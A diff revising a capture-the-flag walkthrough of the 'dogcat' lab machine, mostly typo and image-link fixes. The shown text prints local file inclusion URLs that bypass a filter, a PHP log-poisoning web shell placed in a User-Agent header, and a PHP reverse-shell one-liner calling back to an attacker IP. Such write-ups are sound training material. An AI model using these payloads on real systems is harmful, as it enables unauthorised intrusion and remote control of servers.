@@ -6,11 +6,11 @@
 
 :dog: :cat:
 
-This system involves a slightly tricky Local File Inclusion (LFI) located on the main Apache web server dogcat application. Then I poison the web servers logs with a simple PHP backdoor and gain code execution by viewing the log file via LFI. I then execute a PHP one liner reverse shell using this backdoor to gain the initial shell as the www-data user. I then escalate my privileges the first time to root using sudo /usr/bin/env gtfo escape. Then I escape the docker container to get actual root by exploiting a writeable backup script. 
+This system involves a slightly tricky Local File Inclusion (LFI) attack path located on the main Apache web server dogcat application. I then poison the web server logs with a simple PHP backdoor and gain code execution by viewing the log file via LFI. I then execute a PHP one liner reverse shell using this backdoor to gain the initial shell as the www-data user. I then escalate my privileges the first time to root using sudo /usr/bin/env gtfo escape. Then I escape the docker container to get actual reverse shell as root by exploiting a writeable backup script. 
 
 ## Initial recon
 ### Nmap scan
-I do an fast (-T4) aggressive (-A) version (-SV) can of all (-p-) TCP ports and save the scan to all (-oA) formats and set it to very verbose(-vv) to see results live.
+I do an fast (-T4) aggressive (-A) version (-SV) scan of all (-p-) TCP ports and save the scan to all (-oA) formats and set it to very verbose(-vv) to see results live.
 
 ```bash
 sudo nmap -sV -A -T4 -vv -p- 10.10.92.56 -oA syn_ver_agg_all_tcp_ports
@@ -91,18 +91,21 @@ UDP shows port 68 (DHCP) which is not important in this instance.
 First I manually browse the website and explore its functionality. 
 Right off the bat I notice the applications URL **view** parameter which seems like it can be an avanue for an LFI attack.
 
-I tried multiple LFI URL strings such as the traditional way to try and read the /etc/passwd file but they did not work.
-This did not work as there is logic in the index.php source code that prevents this from happening easily. There are ways around this however as seen below.
+I tried multiple LFI URL code strings such as the traditional way to try and read the /etc/passwd file but they did not work.
+
+This did not work as there is logic in the index.php source code that prevents this from happening easily. 
+There are ways around this however as seen below.
 ```
 http://10.10.124.115/?view=../../../../../../../etc/passwd
 ```
 
-This did work and if we analyze the index.php source code of the application we can understand that there is logic that need to be fulfilled like it must contain the word dog or cat and that it requires an **ext** parameter to be set or it will default to .php.
+The LFI URL code string below did work.
 ```
 http://10.10.124.115/?view=./dog/../../../../../etc/passwd&ext=
 ```
 
 The passwd file did not contain anything interesting.
+
 
 ![dogcat web application](/Images/thm_dogcat_webapp_1.jpg)
 
@@ -126,6 +129,7 @@ http://10.10.92.56/?view=php://filter/convert.base64-encode/resource=./dog/../in
 Base64 decode the string outputted and that will display the contents of the flag.php file.
 
 Here is the index.php source code that I got via the LFI and PHP filter wrapper method.
+If we analyze the index.php source code of the application we can understand that there is logic that needs to be fulfilled in order to get the LFI attack to work. The source code logic says that it must contain the word _dog_ or _cat_ and that it requires an **ext** parameter to be set or it will default to .php as the extention for the specified file.
 
 ```php
 <!DOCTYPE HTML>
@@ -174,6 +178,8 @@ I then modify the **User-Agent:** header and insert the following PHP code into 
 <?php system($_GET['cmd']);?>
 ```
 
+![Burpsuit poison php header](/Images/thm_dogcat_burpsuit_1.jpg)
+
 Now that we I have poisoned the logs I try to execute a simple whoami command to see if it works and it does.
 ```
 http://10.10.124.115/?view=dog../../../../../../var/log/apache2/access.log&ext=&cmd=whoami
@@ -181,7 +187,7 @@ http://10.10.124.115/?view=dog../../../../../../var/log/apache2/access.log&ext=&
 
 ![dogcat LFI to code execution](/Images/thm_dogcat_lfi_2.jpg)
 
-Now I use the following PHP reverse shell oneliner from pentestmonkey.net
+Now I use the following PHP reverse shell one-liner from pentestmonkey.net
 ```
 php -r '$sock=fsockopen("10.11.11.11",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
@@ -190,7 +196,7 @@ php -r '$sock=fsockopen("10.11.11.11",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 I had to URL encode all characters in the php reverse shell code to get it to work properly.
 
-![URL encoded php reverse shell]\(Images\thm_dogcat_burpsuit_3.jpg)
+![URL encoded php reverse shell](/Images/thm_dogcat_burpsuit_3.jpg)
 
 I start a netcat listener on my attacking machine on port 1234 and then send the above GET request using burpsuit to gain the initial shell on the system as the ***www-data** user. With a tiny bit of directory enumeration I find the second flag.
 
@@ -198,7 +204,7 @@ I start a netcat listener on my attacking machine on port 1234 and then send the
 sudo nc -nvlp 1234
 ```
 
-![Images\thm_dogcat_initial_shell.jpg]
+![Initial Shell](/Images/thm_dogcat_initial_shell.jpg)
 
 ## Privilege Escalation
 
@@ -252,4 +258,4 @@ sudo nc -nvlp 9001
 
 ![Root and Flag 4](/Images/thm_dogcat_root_and_flag4.jpg)
 
-That marks the end of this system, obtaining all 4 flags.
+That marks the end of this system, obtaining all 4 flags. The most interesting parts were the unusual LFI attack path due to the logic found in the index.php file and the fact that we were in a docker container that we had to escape to get a final root shell at the end.
